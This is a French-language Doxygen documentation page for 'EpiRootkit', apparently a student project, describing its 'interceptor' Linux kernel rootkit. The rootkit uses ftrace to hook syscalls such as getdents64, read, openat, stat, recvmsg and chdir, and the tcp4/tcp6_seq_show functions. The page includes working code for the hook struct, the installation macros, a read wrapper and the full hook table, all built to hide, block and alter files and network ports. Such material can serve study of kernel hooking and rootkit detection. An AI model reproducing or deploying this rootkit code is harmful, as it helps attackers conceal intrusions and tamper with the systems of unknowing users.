<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: Hooks</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">Par STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('d6/d6f/hooks.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div><div class="header">
  <div class="headertitle"><div class="title">Hooks</div></div>
</div><!--header-->
<div class="contents">
<div class="toc"><h3>Table of Contents</h3>
<ul><ul><li class="level2"><a href="#hooks-introduction">1. ğŸŒ Introduction</a></li>
<li class="level2"><a href="#autotoc_md70">2. ğŸ›ï¸ HistoricitÃ©</a></li>
<li class="level2"><a href="#autotoc_md71">3. âš™ï¸ Composants cÅ“ur</a><ul><li class="level3"><a href="#autotoc_md72">3.1 ğŸ” MÃ©canisme ftrace</a><ul><li class="level4"><a href="#autotoc_md73">3.1.1 Fondations</a></li>
<li class="level4"><a href="#autotoc_md74">3.1.2 Macros</a></li>
<li class="level4"><a href="#autotoc_md75">3.1.3 kallsyms</a></li>
<li class="level4"><a href="#autotoc_md76">3.1.5 fh_install_hook</a></li>
<li class="level4"><a href="#autotoc_md77">3.1.4 fh_ftrace_thunk</a></li>
<li class="level4"><a href="#autotoc_md78">3.1.6 Autre</a></li>
</ul>
</li>
<li class="level3"><a href="#autotoc_md79">3.2 âš™ï¸ API</a></li>
<li class="level3"><a href="#autotoc_md80">3.3 ğŸš€ Initialisation</a></li>
</ul>
</li>
<li class="level2"><a href="#autotoc_md81">4. ğŸª Hooks</a><ul><li class="level3"><a href="#autotoc_md82">4.1 ğŸ‘» hide</a><ul><li class="level4"><a href="#autotoc_md83">4.1.1 Structures</a></li>
<li class="level4"><a href="#autotoc_md84">4.1.2 Interception</a></li>
</ul>
</li>
<li class="level3"><a href="#autotoc_md85">4.2 ğŸš« forbid</a><ul><li class="level4"><a href="#autotoc_md86">4.2.1 Structures</a></li>
<li class="level4"><a href="#autotoc_md87">4.2.2 Interception</a></li>
</ul>
</li>
<li class="level3"><a href="#autotoc_md88">4.3 ğŸ§¬ alterate</a><ul><li class="level4"><a href="#autotoc_md89">4.3.1 Structures</a></li>
<li class="level4"><a href="#autotoc_md90">4.3.2 Interception</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</ul>
</div>
<div class="textblock"><h2><a class="anchor" id="hooks-introduction"></a>
1. ğŸŒ Introduction</h2>
<p>Ce document dÃ©crit de maniÃ¨re prÃ©cise et dÃ©taillÃ©e le fonctionnement de lâ€™architecture <code>interceptor</code> utilisÃ©e dans le rootkit pour intercepter, modifier et contrÃ´ler les appels systÃ¨me sous Linux. Le systÃ¨me <code>interceptor</code> repose sur lâ€™infrastructure <em>ftrace</em>, oÃ¹ chaque <em>hook</em> est capable dâ€™intervenir avant ou aprÃ¨s lâ€™exÃ©cution de la fonction native, de modifier ses arguments ou son rÃ©sultat, et dâ€™Ãªtre activÃ© ou dÃ©sactivÃ© dynamiquement en fonction de fichiers de configuration. Lâ€™organisation du code est structurÃ©e en deux modules principaux : le cÅ“ur (<code>core</code>), responsable de lâ€™installation et de la gestion des hooks, et les modules spÃ©cifiques (<code>hooks</code>) qui implÃ©mentent des comportements tels que le masquage, lâ€™interdiction ou la modification des fichiers et des ports rÃ©seau.</p>
<div class="fragment"><div class="line">interceptor</div>
<div class="line">â”œâ”€â”€ core</div>
<div class="line">â”‚Â Â  â”œâ”€â”€ include</div>
<div class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ ftrace.h</div>
<div class="line">â”‚Â Â  â”‚Â Â  â”œâ”€â”€ init.h</div>
<div class="line">â”‚Â Â  â”‚Â Â  â””â”€â”€ menu.h</div>
<div class="line">â”‚Â Â  â”œâ”€â”€ array.c               # Gestion des tableaux dynamiques de hooks</div>
<div class="line">â”‚Â Â  â”œâ”€â”€ ftrace.c              # ImplÃ©mentation du mÃ©canisme ftrace</div>
<div class="line">â”‚Â Â  â”œâ”€â”€ init.c                # Module init/exit avec fichiers par dÃ©faut.</div>
<div class="line">â”‚Â Â  â””â”€â”€ menu.c                # Menu pour ajouter/enlever des fichiers Ã  traiter</div>
<div class="line">â””â”€â”€ hooks</div>
<div class="line"> Â Â  â”œâ”€â”€ alterate              # Module dâ€™altÃ©ration        </div>
<div class="line"> Â Â  â”‚Â Â  â”œâ”€â”€ alterate_api.c</div>
<div class="line"> Â Â  â”‚Â Â  â”œâ”€â”€ alterate_api.h</div>
<div class="line"> Â Â  â”‚Â Â  â”œâ”€â”€ alterate.c</div>
<div class="line"> Â Â  â”‚Â Â  â””â”€â”€ alterate.h</div>
<div class="line"> Â Â  â”œâ”€â”€ forbid                # Module dâ€™interdiction</div>
<div class="line"> Â Â  â”‚Â Â  â”œâ”€â”€ forbid_api.c</div>
<div class="line"> Â Â  â”‚Â Â  â”œâ”€â”€ forbid_api.h</div>
<div class="line"> Â Â  â”‚Â Â  â”œâ”€â”€ forbid.c</div>
<div class="line"> Â Â  â”‚Â Â  â””â”€â”€ forbid.h</div>
<div class="line"> Â Â  â””â”€â”€ hide                  # Module de camouflage</div>
<div class="line"> Â Â      â”œâ”€â”€ hide_api.c</div>
<div class="line"> Â Â      â”œâ”€â”€ hide_api.h</div>
<div class="line"> Â Â      â”œâ”€â”€ hide.c</div>
<div class="line"> Â Â      â””â”€â”€ hide.h</div>
</div><!-- fragment --><h2><a class="anchor" id="autotoc_md70"></a>
2. ğŸ›ï¸ HistoricitÃ©</h2>
<p>Intercepter un appel systÃ¨me dans le noyau Linux peut se faire par plusieurs approches, chacune avec ses compromis en termes de performance, stabilitÃ© et complexitÃ©. D'aprÃ¨s nos recherches, lâ€™une des mÃ©thodes les plus directes consiste Ã  remplacer une entrÃ©e dans la table des appels systÃ¨me <code>sys_call_table</code> par un pointeur vers une fonction <em>wrapper</em>. Dans cette approche, dÃ¨s que le noyau invoque un numÃ©ro de syscall correspondant Ã  lâ€™index visÃ©, il est redirigÃ© vers notre routine. Si elle est simple Ã  implÃ©menter et Ã  comprendre, Ã  partir des versions 5.x du noyau, la table nâ€™est plus exportÃ©e et devient non-modifiable (Ã©criture protÃ©gÃ©e), rendant cette technique assez instable... en tout cas, nous n'avons pas rÃ©ussi Ã  l'implÃ©menter sur notre version de Linux (6.8.0-58-generic). Nous souhaitions avoir une version du kernel la plus rÃ©cente possible, donc nous avons cherchÃ© une autre faÃ§on de faire. Face Ã  cette contrainte, nous avons envisagÃ© lâ€™utilisation de <em>kprobes</em>, qui insÃ¨rent un <em>breakpoint</em> (<code>int3</code>) sur la fonction cible. Lorsquâ€™elle est appelÃ©e, une exception est levÃ©e, ce qui permet dâ€™exÃ©cuter notre gestionnaire de kprobe. Cependant, cette technique engendre un coÃ»t non nÃ©gligeable en raison des interruptions frÃ©quentes. Nous craignions que la prÃ©sence de nombreux <em>kprobes</em> simultanÃ©s ne provoque un afflux dâ€™interruptions et donc une dÃ©gradation des performances.</p>
<p>Câ€™est pour cette raison que nous nous sommes tournÃ©s vers <code>ftrace</code>, lâ€™infrastructure dâ€™instrumentation native du noyau (notamment utilisÃ© pour mesurer les performances, faire des call graphs, etc). Lâ€™API expose des mÃ©canismes comme <code>register_ftrace_function</code> ou la structure <code>ftrace_ops</code>, permettant de dÃ©finir des callbacks qui reÃ§oivent la structure <code>pt_regs *</code> en paramÃ¨tre. Ã€ partir de lÃ , il devient possible de lire ou modifier les registres, de dÃ©cider dâ€™appeler la fonction originale ou de renvoyer directement un code dâ€™erreur, et mÃªme de modifier la valeur de retour.</p>
<h2><a class="anchor" id="autotoc_md71"></a>
3. âš™ï¸ Composants cÅ“ur</h2>
<h3><a class="anchor" id="autotoc_md72"></a>
3.1 ğŸ” MÃ©canisme ftrace</h3>
<p>Le mÃ©canisme <em>ftrace</em> du module interceptor sâ€™appuie principalement sur deux fichiers : <a class="el" href="../../d5/d29/ftrace_8h.html">core/include/ftrace.h</a>, qui dÃ©finit la structure et les prototypes, et <a class="el" href="../../dd/d2c/ftrace_8c.html">core/ftrace.c</a>, qui implÃ©mente les fonctions dâ€™installation et de suppression des hooks. Nous dÃ©crivons ici en dÃ©tail chaque Ã©tape, du repÃ©rage du symbole Ã  lâ€™interception effective, en illustrant par des extraits de code.</p>
<h4><a class="anchor" id="autotoc_md73"></a>
3.1.1 Fondations</h4>
<div class="fragment"><div class="line"><span class="keyword">struct </span><a class="code hl_struct" href="../../de/d57/structftrace__hook.html">ftrace_hook</a>{</div>
<div class="line">    <span class="keyword">const</span> <span class="keywordtype">char</span> *<a class="code hl_variable" href="../../de/d57/structftrace__hook.html#a8f8f80d37794cde9472343e4487ba3eb">name</a>;       <span class="comment">// Nom du symbole (syscall ou fonction) Ã  intercepter</span></div>
<div class="line">    <span class="keywordtype">void</span> *<a class="code hl_variable" href="../../de/d57/structftrace__hook.html#aea3dcf0c8de30d192ee92494131c4996">function</a>;         <span class="comment">// Adresse de notre fonction de hook (wrapper)</span></div>
<div class="line">    <span class="keywordtype">void</span> *<a class="code hl_variable" href="../../de/d57/structftrace__hook.html#acfdd77d31632e0883c12d315ead39b18">original</a>;         <span class="comment">// Adresse de la fonction native (backup)</span></div>
<div class="line">    <span class="keywordtype">unsigned</span> <span class="keywordtype">long</span> <a class="code hl_variable" href="../../de/d57/structftrace__hook.html#a7b040c2a9ff2de87c6e993af94e23e26">address</a>;  <span class="comment">// Adresse effective du symbole dans le noyau</span></div>
<div class="line">    <span class="keyword">struct </span>ftrace_ops <a class="code hl_variable" href="../../de/d57/structftrace__hook.html#ac8ddb477a1c51b9535ade03ecb0e9732">ops</a>;  <span class="comment">// Structure ftrace pour gÃ©rer lâ€™interception</span></div>
<div class="line">};</div>
<div class="ttc" id="astructftrace__hook_html"><div class="ttname"><a href="../../de/d57/structftrace__hook.html">ftrace_hook</a></div><div class="ttdef"><b>Definition</b> <a href="../../d5/d29/ftrace_8h_source.html#l00009">ftrace.h:9</a></div></div>
<div class="ttc" id="astructftrace__hook_html_a7b040c2a9ff2de87c6e993af94e23e26"><div class="ttname"><a href="../../de/d57/structftrace__hook.html#a7b040c2a9ff2de87c6e993af94e23e26">ftrace_hook::address</a></div><div class="ttdeci">unsigned long address</div><div class="ttdef"><b>Definition</b> <a href="../../d5/d29/ftrace_8h_source.html#l00013">ftrace.h:13</a></div></div>
<div class="ttc" id="astructftrace__hook_html_a8f8f80d37794cde9472343e4487ba3eb"><div class="ttname"><a href="../../de/d57/structftrace__hook.html#a8f8f80d37794cde9472343e4487ba3eb">ftrace_hook::name</a></div><div class="ttdeci">const char * name</div><div class="ttdef"><b>Definition</b> <a href="../../d5/d29/ftrace_8h_source.html#l00010">ftrace.h:10</a></div></div>
<div class="ttc" id="astructftrace__hook_html_ac8ddb477a1c51b9535ade03ecb0e9732"><div class="ttname"><a href="../../de/d57/structftrace__hook.html#ac8ddb477a1c51b9535ade03ecb0e9732">ftrace_hook::ops</a></div><div class="ttdeci">struct ftrace_ops ops</div><div class="ttdef"><b>Definition</b> <a href="../../d5/d29/ftrace_8h_source.html#l00014">ftrace.h:14</a></div></div>
<div class="ttc" id="astructftrace__hook_html_acfdd77d31632e0883c12d315ead39b18"><div class="ttname"><a href="../../de/d57/structftrace__hook.html#acfdd77d31632e0883c12d315ead39b18">ftrace_hook::original</a></div><div class="ttdeci">void * original</div><div class="ttdef"><b>Definition</b> <a href="../../d5/d29/ftrace_8h_source.html#l00012">ftrace.h:12</a></div></div>
<div class="ttc" id="astructftrace__hook_html_aea3dcf0c8de30d192ee92494131c4996"><div class="ttname"><a href="../../de/d57/structftrace__hook.html#aea3dcf0c8de30d192ee92494131c4996">ftrace_hook::function</a></div><div class="ttdeci">void * function</div><div class="ttdef"><b>Definition</b> <a href="../../d5/d29/ftrace_8h_source.html#l00011">ftrace.h:11</a></div></div>
</div><!-- fragment --><p>Au cÅ“ur de ce mÃ©canisme se trouve la structure <a class="el" href="../../de/d57/structftrace__hook.html">ftrace_hook</a>, qui regroupe toutes les informations nÃ©cessaires pour quâ€™un hook fonctionne.</p><ul>
<li><code>name</code> contient le nom du symbole que lâ€™on souhaite surveiller.</li>
<li><code>function</code> sert Ã  pointer vers notre fonction <em>custom</em>.</li>
<li><code>address</code> est utilisÃ© pour conserver l'adresse grÃ¢ce Ã  la fonction <em>kallsyms_lookup_name</em>.</li>
<li><code>struct ftrace_ops</code> sert Ã  communiquer avec lâ€™API ftrace.</li>
</ul>
<p>Pour que notre <em>wrapper</em> puisse invoquer la fonction originale, on stocke aussi lâ€™adresse de la fonction native dans <code>original</code>. Dans le code de fh_install_hook de <a class="el" href="../../dd/d2c/ftrace_8c.html">ftrace.c</a>, on observe : </p><div class="fragment"><div class="line">hook-&gt;address = kallsyms_lookup(hook-&gt;name);</div>
<div class="line">...</div>
<div class="line">*((<span class="keywordtype">unsigned</span> <span class="keywordtype">long</span> *)hook-&gt;original) = hook-&gt;address;</div>
</div><!-- fragment --><p> Ici, la premiÃ¨re ligne rÃ©sout lâ€™adresse du symbole et la stocke dans <code>hook-&gt;address</code>. Cette valeur sert ensuite Ã  instruire ftrace. Quant Ã  <code>hook-&gt;original</code>, il pointe vers une variable de type <code>unsigned long</code> dÃ©finie dans le module de hook lui-mÃªme (par exemple, <code>__orig_read</code> dans le cas dâ€™un hook sur <code>read</code>) et permet au <em>wrapper</em>, plus tard, dâ€™appeler la vraie fonction noyau. Ce nâ€™est pas forcÃ©ment essentiel, mais Ã§a simplifie grandement le code. Par exemple, dans <a class="el" href="../../d9/dcc/alterate_8c.html">alterate.c</a>, on aura : </p><div class="fragment"><div class="line">asmlinkage long (*<a class="code hl_variable" href="../../d9/dcc/alterate_8c.html#ae51b27b7aeb2568ebc4dafc472bb4d95">__orig_read</a>)(<span class="keyword">const</span> <span class="keyword">struct </span>pt_regs *) = NULL;</div>
<div class="line">asmlinkage <span class="keywordtype">long</span> notrace <a class="code hl_function" href="../../d9/dcc/alterate_8c.html#afd947c42c2ab6eb7c6ef561a1c159e22">read_hook</a>(<span class="keyword">const</span> <span class="keyword">struct</span> pt_regs *regs) {</div>
<div class="line">    <span class="keywordtype">long</span> ret = <a class="code hl_variable" href="../../d9/dcc/alterate_8c.html#ae51b27b7aeb2568ebc4dafc472bb4d95">__orig_read</a>(regs);</div>
<div class="line">    <span class="keywordflow">if</span> (ret &lt;= 0)</div>
<div class="line">        <span class="keywordflow">return</span> ret;</div>
<div class="line">    ...</div>
<div class="line">}</div>
<div class="ttc" id="aalterate_8c_html_ae51b27b7aeb2568ebc4dafc472bb4d95"><div class="ttname"><a href="../../d9/dcc/alterate_8c.html#ae51b27b7aeb2568ebc4dafc472bb4d95">__orig_read</a></div><div class="ttdeci">asmlinkage long(* __orig_read)(const struct pt_regs *)</div><div class="ttdef"><b>Definition</b> <a href="../../d9/dcc/alterate_8c_source.html#l00006">alterate.c:6</a></div></div>
<div class="ttc" id="aalterate_8c_html_afd947c42c2ab6eb7c6ef561a1c159e22"><div class="ttname"><a href="../../d9/dcc/alterate_8c.html#afd947c42c2ab6eb7c6ef561a1c159e22">read_hook</a></div><div class="ttdeci">asmlinkage long notrace read_hook(const struct pt_regs *regs)</div><div class="ttdef"><b>Definition</b> <a href="../../d9/dcc/alterate_8c_source.html#l00008">alterate.c:8</a></div></div>
</div><!-- fragment --><h4><a class="anchor" id="autotoc_md74"></a>
3.1.2 Macros</h4>
<p>Pour faciliter la dÃ©claration dâ€™un hook sur un syscall, nous avons introduit trois macros. <a class="el" href="../../d5/d29/ftrace_8h.html#a51626369f6e362e802ba0d896b2a1296">SYSCALL_NAME(name)</a> prÃ©fixe automatiquement la chaÃ®ne par *__x64_*, de sorte que lâ€™on nâ€™ait pas Ã  Ã©crire manuellement le nom exact du symbole. La macro <a class="el" href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS(_name, _hook, _orig)</a> simplifie ensuite lâ€™initialisation dâ€™un Ã©lÃ©ment <a class="el" href="../../de/d57/structftrace__hook.html">ftrace_hook</a> en lui fournissant en une seule ligne le nom du syscall, lâ€™adresse de notre fonction de hook et la variable oÃ¹ sera stockÃ© le pointeur original. Pour des fonctions du noyau qui ne sont pas des syscalls, on peut utiliser la macro plus gÃ©nÃ©rique <a class="el" href="../../d5/d29/ftrace_8h.html#aab9ca6da4cf514341b664e97f145dc1f">HOOK(_name, _hook, _orig)</a>. </p><div class="fragment"><div class="line"><span class="preprocessor">#define SYSCALL_NAME(name) (&quot;__x64_&quot; name)</span></div>
<div class="line"><span class="preprocessor">#define HOOK_SYS(_name, _hook, _orig) {                 \</span></div>
<div class="line"><span class="preprocessor">    .name = SYSCALL_NAME(_name),                        \</span></div>
<div class="line"><span class="preprocessor">    .function = (_hook),                                \</span></div>
<div class="line"><span class="preprocessor">    .original = (_orig),                                \</span></div>
<div class="line"><span class="preprocessor">}</span></div>
<div class="line"> </div>
<div class="line"><span class="preprocessor">#define HOOK(_name, _hook, _orig) {                     \</span></div>
<div class="line"><span class="preprocessor">    .name = (_name),                                    \</span></div>
<div class="line"><span class="preprocessor">    .function = (_hook),                                \</span></div>
<div class="line"><span class="preprocessor">    .original = (_orig),                                \</span></div>
<div class="line"><span class="preprocessor">}</span></div>
</div><!-- fragment --><p>Le reste de <a class="el" href="../../d5/d29/ftrace_8h.html">ftrace.h</a> se compose surtout de prototypes.</p><ul>
<li><code>fh_init_kallsyms_lookup</code> sert Ã  rÃ©cupÃ©rer un pointeur vers la fonction interne <code>kallsyms_lookup_name()</code>, en installant temporairement un kprobe.</li>
<li><code>fh_install_hook</code> et <code>fh_remove_hook</code> gÃ¨rent respectivement lâ€™installation et la suppression dâ€™un hook.</li>
<li><code>fh_install_hooks</code> et <code>fh_remove_hooks</code> permettent de gÃ©rer en bloc un tableau de hooks.</li>
</ul>
<p>La liste de lâ€™ensemble des hooks implÃ©mentÃ©s peut Ãªtre retrouvÃ©e dans <a class="el" href="../../dc/dcc/array_8c.html">array.c</a> : </p><div class="fragment"><div class="line"><span class="keyword">struct </span><a class="code hl_struct" href="../../de/d57/structftrace__hook.html">ftrace_hook</a> <a class="code hl_variable" href="../../dc/dcc/array_8c.html#a7d16813c4484af7b43fd05ab384d2450">hooks</a>[] = {</div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS</a>(<span class="stringliteral">&quot;sys_getdents64&quot;</span>, <a class="code hl_function" href="../../de/deb/hide_8c.html#a633e6a45f4fd262cff62ed627198bf3e">getdents64_hook</a>, &amp;<a class="code hl_variable" href="../../de/deb/hide_8c.html#ac94011be5f0bbfd7f49bc58dfa342001">__orig_getdents64</a>),</div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS</a>(<span class="stringliteral">&quot;sys_read&quot;</span>, <a class="code hl_function" href="../../d9/dcc/alterate_8c.html#afd947c42c2ab6eb7c6ef561a1c159e22">read_hook</a>, &amp;<a class="code hl_variable" href="../../d9/dcc/alterate_8c.html#ae51b27b7aeb2568ebc4dafc472bb4d95">__orig_read</a>),</div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS</a>(<span class="stringliteral">&quot;sys_openat&quot;</span>, <a class="code hl_function" href="../../dc/dfc/forbid_8c.html#ae57c99a859f85f46bca995e81dd73c33">openat_hook</a>, &amp;<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#a6ad11cda928e1900c9695739b9031986">__orig_openat</a>),</div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS</a>(<span class="stringliteral">&quot;sys_newfstatat&quot;</span>, <a class="code hl_function" href="../../dc/dfc/forbid_8c.html#ac71e6b72dd491c3ff7b0334e1f388f44">stat_hook</a>, &amp;<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#abc34c3e67683e701614f5ba8bad72be0">__orig_newfstatat</a>),</div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS</a>(<span class="stringliteral">&quot;sys_fstat&quot;</span>, <a class="code hl_function" href="../../dc/dfc/forbid_8c.html#ac71e6b72dd491c3ff7b0334e1f388f44">stat_hook</a>, &amp;<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#ada76679bffc7821d9893455db4813201">__orig_fstat</a>),</div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS</a>(<span class="stringliteral">&quot;sys_lstat&quot;</span>, <a class="code hl_function" href="../../dc/dfc/forbid_8c.html#ac71e6b72dd491c3ff7b0334e1f388f44">stat_hook</a>, &amp;<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#a7701cf8c8631b444abe7ba78428a7ee4">__orig_lstat</a>),</div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS</a>(<span class="stringliteral">&quot;sys_stat&quot;</span>, <a class="code hl_function" href="../../dc/dfc/forbid_8c.html#ac71e6b72dd491c3ff7b0334e1f388f44">stat_hook</a>, &amp;<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#ae32e5cb44540533f60b81e4ae52e859f">__orig_stat</a>),</div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS</a>(<span class="stringliteral">&quot;sys_recvmsg&quot;</span>, <a class="code hl_function" href="../../de/deb/hide_8c.html#a25875c3a0e7c9ebc4533731bb98a5768">recvmsg_hook</a>, &amp;<a class="code hl_variable" href="../../de/deb/hide_8c.html#a9a588e3d7a442f79438c99ae9c46b6cf">__orig_recvmsg</a>),</div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#afa697c23f08f00ffd9625f6da1d4ffe8">HOOK_SYS</a>(<span class="stringliteral">&quot;sys_chdir&quot;</span>, <a class="code hl_function" href="../../dc/dfc/forbid_8c.html#a6952f779f1ad4e597903ebc4e7b4cdc2">chdir_hook</a>, &amp;<a class="code hl_variable" href="../../dc/dfc/forbid_8c.html#a2ce752d9cf8f54043f9a858f3c905eae">__orig_chdir</a>),</div>
<div class="line"> </div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#aab9ca6da4cf514341b664e97f145dc1f">HOOK</a>(<span class="stringliteral">&quot;tcp4_seq_show&quot;</span>, <a class="code hl_function" href="../../de/deb/hide_8c.html#aba501edbfd8175fb82cd90ee84a8d33c">tcp4_seq_show_hook</a>, &amp;<a class="code hl_variable" href="../../de/deb/hide_8c.html#ac44c2733f8af7c2c57ab9bba3e85835c">__orig_tcp4_seq_show</a>),</div>
<div class="line">    <a class="code hl_define" href="../../d5/d29/ftrace_8h.html#aab9ca6da4cf514341b664e97f145dc1f">HOOK</a>(<span class="stringliteral">&quot;tcp6_seq_show&quot;</span>, <a class="code hl_function" href="../../de/deb/hide_8c.html#a93b8d4cf1b9a2ebf9b0e642eaab52fa2">tcp6_seq_show_hook</a>, &amp;<a class="code hl_variable" href="../../de/deb/hide_8c.html#a6f6985ce4f31df32aa9a0466826796ed">__orig_tcp6_seq_show</a>)</div>
<div class="line">};</div>
<div class="ttc" id="aarray_8c_html_a7d16813c4484af7b43fd05ab384d2450"><div class="ttname"><a href="../../dc/dcc/array_8c.html#a7d16813c4484af7b43fd05ab384d2450">hooks</a></div><div class="ttdeci">struct ftrace_hook hooks[]</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dcc/array_8c_source.html#l00006">array.c:6</a></div></div>
<div class="ttc" id="aforbid_8c_html_a2ce752d9cf8f54043f9a858f3c905eae"><div class="ttname"><a href="../../dc/dfc/forbid_8c.html#a2ce752d9cf8f54043f9a858f3c905eae">__orig_chdir</a></div><div class="ttdeci">asmlinkage long(* __orig_chdir)(const struct pt_regs *regs)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dfc/forbid_8c_source.html#l00010">forbid.c:10</a></div></div>
<div class="ttc" id="aforbid_8c_html_a6952f779f1ad4e597903ebc4e7b4cdc2"><div class="ttname"><a href="../../dc/dfc/forbid_8c.html#a6952f779f1ad4e597903ebc4e7b4cdc2">chdir_hook</a></div><div class="ttdeci">asmlinkage long notrace chdir_hook(const struct pt_regs *regs)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dfc/forbid_8c_source.html#l00066">forbid.c:66</a></div></div>
<div class="ttc" id="aforbid_8c_html_a6ad11cda928e1900c9695739b9031986"><div class="ttname"><a href="../../dc/dfc/forbid_8c.html#a6ad11cda928e1900c9695739b9031986">__orig_openat</a></div><div class="ttdeci">asmlinkage long(* __orig_openat)(const struct pt_regs *)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dfc/forbid_8c_source.html#l00005">forbid.c:5</a></div></div>
<div class="ttc" id="aforbid_8c_html_a7701cf8c8631b444abe7ba78428a7ee4"><div class="ttname"><a href="../../dc/dfc/forbid_8c.html#a7701cf8c8631b444abe7ba78428a7ee4">__orig_lstat</a></div><div class="ttdeci">asmlinkage long(* __orig_lstat)(const struct pt_regs *)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dfc/forbid_8c_source.html#l00007">forbid.c:7</a></div></div>
<div class="ttc" id="aforbid_8c_html_abc34c3e67683e701614f5ba8bad72be0"><div class="ttname"><a href="../../dc/dfc/forbid_8c.html#abc34c3e67683e701614f5ba8bad72be0">__orig_newfstatat</a></div><div class="ttdeci">asmlinkage long(* __orig_newfstatat)(const struct pt_regs *)</div><div class="ttdef"><b>Definition</b> <a href="../../dc/dfc/forbid_8c_source.html#l00006">forbid.c:6</a></div></div>
